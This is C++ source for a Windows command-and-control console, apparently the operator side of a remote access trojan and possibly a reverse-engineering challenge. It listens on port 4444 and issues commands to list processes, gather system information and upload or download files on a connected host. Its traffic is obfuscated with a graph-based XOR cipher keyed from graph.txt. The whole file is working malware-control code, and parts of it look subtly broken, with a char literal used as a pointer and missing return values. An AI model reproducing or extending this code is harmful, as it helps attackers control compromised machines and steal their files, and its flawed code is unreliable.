#define WIN32_LEAN_AND_MEAN
#undef UNICODE

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <vector>
#include <stack>
#include <queue>
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#define _CRT_SECURE_NO_WARNINGS

#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT "4444"

typedef std::vector<int> vi;

char *commands[6] = {"GiveMeProcesses", "DownloadMyFile", "UploadThisFile", "GiveMeInfo", "Yeet", "exit"};
bool visited[DEFAULT_BUFLEN];
int maxDepth = 0;
char *NotKey = "MuchReversingButThisIsNotTheKeyHeheMuchReversingButThisIsNotTheKeyHehe";
char *KeyFile = "graph.txt";
int idx = 0;
SOCKET ourSock;
std::vector<vi> G;

void WeInitGraph() {
	std::ifstream inp(KeyFile);
	std::string line;
	while (std::getline(inp, line)) {
		vi gu = vi();
		for (unsigned int i = 0; i < line.length(); i++) {
			if (line[i] == '1') {
				gu.push_back(i);
			}
		}
		G.push_back(gu);
	}
}

void WeDFS(int u, char *data, int stop) {
	if (idx + 1 >= stop) {
		return;
	}

	if (visited[u]) {
		return;
	}

	idx += 1;
	data[idx] ^= NotKey[u % strlen(NotKey)];
	visited[u] = true;
	for (unsigned int i = 0; i < G[u].size(); i++) {
		int v = G[u][i];
		if (visited[v]) {
			continue;
		}
		WeDFS(v, data, stop);
	}
}

void WeEncryptOrWeDecrypt(char *data, int length) {
	int nBytesProcessed = 0;
	char *ptr = data;
	while (nBytesProcessed < length) {
		memset(visited, 0, sizeof(visited));
		idx = -1;
		WeDFS(0, ptr, length - nBytesProcessed);
		if (idx == -1) {
			puts("\nDone DEncrypting");
		}
		else {
			ptr += idx + 1;
			nBytesProcessed += idx + 1;
		}
	}
	puts("\nDone DEncrypting");
}

int WeInitSocket() {
	WSADATA wsaData;
	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL;
	struct addrinfo hints;

	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %x\n", iResult);
		WSACleanup();
		return 1;
	}

	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	
	char *sndbuf = '\0\0\0\0';
	setsockopt(ListenSocket, SOL_SOCKET, SO_SNDBUF, sndbuf, 4);

	if (ListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %x\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("bind failed with error: %x\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("listen failed with error: %x\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed with error: %x\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	closesocket(ListenSocket);
	ourSock = ClientSocket;
}

int WeShutdownSocket() {
	int iResult = shutdown(ourSock, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ourSock);
		WSACleanup();
		return 1;
	}

	closesocket(ourSock);
	WSACleanup();
}

int WeSendData(std::string data, SOCKET sock) {
	int allocLen = max(DEFAULT_BUFLEN, data.length() + 1);
	printf("Data length: %d\n", data.length());
	char *cdata = (char *)malloc(allocLen);
	memcpy(cdata, data.c_str(), data.length());
	cdata[data.length()] = 0;
	WeEncryptOrWeDecrypt(cdata, data.length());
	send(sock, "yeeted", strlen("yeeted"), 0);
	int iResult = send(sock, cdata, data.length(), 0);
	if (iResult == SOCKET_ERROR) {
		printf("send failed with error: %x\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return 1;
	}
	memset(cdata, 0, allocLen);
	strcpy(cdata, "yeeted");
	send(sock, cdata, allocLen, 0);
	free(cdata);
	return iResult;
}

int WeRecvData(char *&cdata, SOCKET sock) {
	char recvbuf[DEFAULT_BUFLEN];
	std::string yeet = "";
	bool isYeeted = false;

	while (true) {
		memset(recvbuf, 0, sizeof(recvbuf));
		int iResult = recv(ourSock, recvbuf, DEFAULT_BUFLEN - 1, 0);

		if (iResult > 0) {
			yeet += std::string(recvbuf, iResult);
			int yeetidx = yeet.find("yeeted");
			if (yeetidx != -1) {
				if (isYeeted)  {
					yeet.erase(yeetidx);
					break;
				}
				else {
					yeet.erase(0, yeetidx + strlen("yeeted"));
					isYeeted = true;
				}
			}
		}
		else if (iResult == 0) {
			printf("Connection closing...\n");
		}
		else  {
			printf("recv failed with error: %d\n", WSAGetLastError());
			closesocket(ourSock);
			WSACleanup();
			return 1;
		}
	}

	printf("Yeet length: %d\n", yeet.length());
	cdata = (char *)malloc(yeet.length() + 1);
	memcpy(cdata, yeet.c_str(), yeet.length());
	WeEncryptOrWeDecrypt(cdata, yeet.length());
	cdata[yeet.length()] = 0;
}

int main(int argc, char **argv) {
	WeInitGraph();
	WeInitSocket();

	int iResult;
	int iSendResult;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;
	char inp[DEFAULT_BUFLEN];

	while (true) {
		printf("Command: ");
		memset(inp, 0, sizeof(inp));

		scanf("%s", inp);
		std::stringstream inpStringStream(inp);
		std::string token;
		inpStringStream >> token;

		WeSendData(std::string(inp), ourSock);
		char *data = NULL;
		if (!token.compare(commands[0])) {
			WeRecvData(data, ourSock);
			puts(data);
		} else if (!token.compare(commands[1])) {
			printf("Local File Name: ");
			scanf("%s", inp);
			FILE *fp = fopen(inp, "rb");
			fseek(fp, 0, SEEK_END);
			unsigned long filesize = ftell(fp);
			fseek(fp, 0, SEEK_SET);
			char *data = (char *)malloc(filesize);
			fread(data, 1, filesize, fp);
			fclose(fp);

			printf("Remote File Name: ");
			scanf("%s", inp);
			WeSendData(std::string(inp), ourSock);

			std::stringstream ss;
			ss << filesize;
			WeSendData(ss.str(), ourSock);
			
			WeSendData(std::string(data, filesize), ourSock);
		} else if (!token.compare(commands[2])) {
			printf("Local File Name: ");
			scanf("%s", inp);
			FILE *fp = fopen(inp, "wb");
			if (fp == NULL) {
				printf("fopen error\n");
			}

			printf("Remote File Name: ");
			scanf("%s", inp);
			WeSendData(std::string(inp), ourSock);

			char *filesize;
			WeRecvData(filesize, ourSock);
			unsigned long fsize = atoi(filesize);
			printf("File size: %lu\n", fsize);

			WeRecvData(data, ourSock);
			fwrite((void *)data, 1, fsize, fp);
			fclose(fp);
		} else if (!token.compare(commands[3])) {
			WeRecvData(data, ourSock);
			puts(data);
		} else if (!token.compare(commands[5])) {
			exit(0);
		} else {
			WeRecvData(data, ourSock);
			puts(data);
		}

		if (data) {
			free(data);
		}
	}
	
	WeShutdownSocket();
	return 0;
}